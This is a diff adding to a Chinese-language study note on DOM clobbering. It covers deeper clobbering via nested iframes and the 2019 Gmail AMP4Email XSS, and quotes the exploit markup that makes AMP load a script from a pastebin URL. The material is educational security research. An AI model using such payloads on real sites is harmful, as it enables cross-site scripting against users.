@@ -2,7 +2,7 @@
 aliases: []
 tags: ['Security','date/2022-11','year/2022','month/11']
 date: 2022-11-08-星期二 17:19:29
-update: 2022-11-09-星期三 14:46:23
+update: 2022-11-09-星期三 15:17:25
 ---
 
 [原文](https://blog.huli.tw/2021/01/23/dom-clobbering/)
@@ -342,3 +342,181 @@ console.log(window.TEST_MODE + '')
 </body>  
 </html>
 ```
+
+先利用同名的 id，让 `config` 可以拿到 HTMLCollection，再来用 `config.prod` 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那个 form，接着就是 `form.apiUrl` 拿到表单底下的 input，最后用 value 拿到里面的属性。
+
+所以如果最后要拿的属性是 HTML 的属性，就可以四层，否则的话就只能三层。
+
+## 再更多层级的 DOM Clobbering
+
+前面提到三层或是有条件的四层已经是极限了，那有没有办法再突破限制呢？
+
+根据 [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back) 里面给的做法，有，利用 iframe 就可以达到！
+
+当你建了一个 iframe 并且给它一个 name 的时候，用这个 name 就可以指到 iframe 里面的 window，所以可以像这样：
+
+```html
+<!DOCTYPE html>  
+<html>  
+<body>  
+  <iframe name="config" srcdoc='  
+    <a id="apiUrl"></a>  
+  '></iframe>  
+  <script>  
+    setTimeout(() => {  
+      console.log(config.apiUrl) // <a id="apiUrl"></a>  
+    }, 500)  
+  </script>  
+</body>  
+</html>
+```
+
+这边之所以会需要 setTimeout 是因为 iframe 并不是同步载入的，所以需要一些时间才能正确抓到 iframe 里面的东西。
+
+有了 iframe 的帮助之后，就可以创造出更多层级：
+
+```html
+<!DOCTYPE html>  
+<html>  
+<body>  
+  <iframe name="moreLevel" srcdoc='  
+    <form id="config"></form>  
+    <form id="config" name="prod">  
+      <input name="apiUrl" value="123" />  
+    </form>  
+  '></iframe>  
+  <script>  
+    setTimeout(() => {  
+      console.log(moreLevel.config.prod.apiUrl.value) //123  
+    }, 500)  
+  </script>  
+</body>  
+</html>
+```
+
+理论上你可以在 iframe 里面再用一个 iframe，就可以达成无限多层级的 DOM clobbering，不过我试了一下发现可能有点编码的问题需要处理，例如说像是这样：
+
+```html
+<!DOCTYPE html>  
+<html>  
+<body>  
+  <iframe name="level1" srcdoc='  
+    <iframe name="level2" srcdoc="  
+      <iframe name="level3"></iframe>  
+    "></iframe>  
+  '></iframe>  
+  <script>  
+    setTimeout(() => {  
+      console.log(level1.level2.level3) // undefined  
+    }, 500)  
+  </script>  
+</body>  
+</html>
+```
+
+印出来会是 undefined，但如果把 level3 的那两个双引号拿掉，直接写成 `name=level3` 就可以成功印出东西来，我猜是因为单引号双引号的一些解析问题造成的，目前还没找到什么解法，只尝试了这样是 ok 的，但是再往下就出错了：
+
+```html
+<!DOCTYPE html>  
+<html>  
+<body>  
+  <iframe name="level1" srcdoc="  
+    <iframe name=&quot;level2&quot; srcdoc=&quot;  
+      <iframe name='level3' srcdoc='  
+        <iframe name=level4></iframe>  
+      '></iframe>  
+    &quot;></iframe>  
+  "></iframe>  
+  <script>  
+    setTimeout(() => {  
+      console.log(level1.level2.level3.level4)  
+    }, 500)  
+  </script>  
+</body>  
+</html>
+```
+
+用这样就可以无限多层了:
+
+```html
+<iframe name=a srcdoc="  
+  <iframe name=b srcdoc=&quot  
+    <iframe name=c srcdoc=&amp;quot;  
+      <iframe name=d srcdoc=&amp;amp;quot;  
+        <iframe name=e srcdoc=&amp;amp;amp;quot;  
+          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;  
+            <div id=g>123</div>  
+          &amp;amp;amp;amp;quot;></iframe>  
+        &amp;amp;amp;quot;></iframe>  
+      &amp;amp;quot;></iframe>  
+    &amp;quot;></iframe>  
+  &quot></iframe>  
+"></iframe>
+```
+
+## 实际案例研究：Gmail AMP4Email XSS
+
+在 2019 年的时候 Gmail 有一个漏洞就是透过 DOM clobbering 来攻击的，完整的 write up 在这边：[XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)，底下我就稍微讲一下过程（内容都取材自上面这篇文章）。
+
+简单来说呢，在 Gmail 里面你可以使用部分 AMP 的功能，然后 Google 针对这个格式的 validator 很严谨，所以没有办法透过一般的方法 XSS。
+
+但是有人发现可以在 HTML 元素上面设置 id，又发现当他设置了一个 `<a id="AMP_MODE">` 之后，console 突然出现一个载入 script 的错误，而且网址中的其中一段是 undefined。仔细去研究程式码之后，有一段程式码大概是这样的：
+
+```js
+var script = window.document.createElement("script");  
+script.async = false;  
+  
+var loc;  
+if (AMP_MODE.test && window.testLocation) {  
+    loc = window.testLocation  
+} else {  
+    loc = window.location;  
+}  
+  
+if (AMP_MODE.localDev) {  
+    loc = loc.protocol + "//" + loc.host + "/dist"  
+} else {  
+    loc = "https://cdn.ampproject.org";  
+}  
+  
+var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";  
+b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";  
+  
+document.head.appendChild(b);
+```
+
+如果我们能让 `AMP_MODE.test` 跟 `AMP_MODE.localDev` 都是 truthy 的话，再搭配设置 `window.testLocation`，就能够载入任意的 script！
+
+所以 exploit 会长的像这样：
+
+```html
+// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西  
+<a id="AMP_MODE" name="localDev"></a>  
+<a id="AMP_MODE" name="test"></a>  
+  
+// 設置 testLocation.protocol  
+<a id="testLocation"></a>  
+<a id="testLocation" name="protocol"   
+   href="https://pastebin.com/raw/0tn8z0rG#"></a>
+```
+
+最后就能成功载入任意 script，进而达成 XSS！ （不过当初作者只有试到这一步就被 CSP 挡住了）。
+
+这应该是 DOM Clobbering 最有名的案例之一了。
+
+## 总结
+
+虽然说 DOM Clobbering 的使用场合有限，但真的是个相当有趣的攻击方式！而且如果你不知道这个 feature 的话，可能完全没想过可以透过 HTML 来影响全域变数的内容。
+
+如果对这个攻击手法有兴趣的，可以参考 PortSwigger 的[文章](https://portswigger.net/web-security/dom-based/dom-clobbering)，里面提供了两个 lab 让大家亲自尝试这个攻击手法，光看是没用的，要实际下去攻击才更能体会。
+
+参考资料：
+
+1. [使用 Dom Clobbering 扩展 XSS](http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships)
+2. [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back)
+3. [DOM Clobbering Attack学习记录.md](https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
+4. [DOM Clobbering学习记录](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
+5. [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
+6. [Is there a spec that the id of elements should be made global variable?](https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable)
+7. [Why don’t we just use element IDs as identifiers in JavaScript?](https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript)
+8. [Do DOM tree elements with ids become global variables?](https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables)
